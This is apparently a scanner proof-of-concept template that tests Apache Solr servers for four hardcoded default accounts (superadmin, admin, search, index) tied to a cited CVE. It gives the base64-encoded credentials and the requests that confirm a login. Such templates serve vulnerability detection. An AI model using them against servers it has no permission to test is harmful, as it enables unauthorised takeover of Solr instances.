name: poc-yaml-apache-solr-default-credentials
groups:
  superadmin:
    - method: GET
      path: /solr/admin/info/system?wt=json
      headers:
        Authorization: Basic c3VwZXJhZG1pbjpzdXBlcmFkbWlu
      follow_redirects: false
      expression: >
        response.status == 200 && response.body.bcontains(b"solr_home") && response.body.bcontains(b"lucene")
  admin:
    - method: GET
      path: /solr/admin/info/system?wt=json
      headers:
        Authorization: Basic YWRtaW46YWRtaW4=
      follow_redirects: false
      expression: >
        response.status == 200 && response.body.bcontains(b"solr_home") && response.body.bcontains(b"lucene")
  search:
    - method: GET
      path: /solr/admin/info/system?wt=json
      headers:
        Authorization: Basic c2VhcmNoOnNlYXJjaA==
      follow_redirects: false
      expression: >
        response.status == 200 && response.body.bcontains(b"solr_home") && response.body.bcontains(b"lucene")
  index:
    - method: GET
      path: /solr/admin/info/system?wt=json
      headers:
        Authorization: Basic aW5kZXg6aW5kZXg=
      follow_redirects: false
      expression: >
        response.status == 200 && response.body.bcontains(b"solr_home") && response.body.bcontains(b"lucene")
detail:
  author: L4xy
  description: "Apache Solr 9.4.0至9.10.1及10.0.0版本中，使用bin/solr auth enable命令开启认证时会静默创建4组硬编码默认账号(superadmin/admin/search/index)，攻击者可直接登录接管Solr服务"
  links:
    - https://blog.csdn.net/qq_39308071/article/details/161925370
    - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
    - https://nvd.nist.gov/vuln/detail/CVE-2026-44825
    - https://github.com/advisories/GHSA-qhr7-h655-pw6r
  tags: default-credentials,solr,apache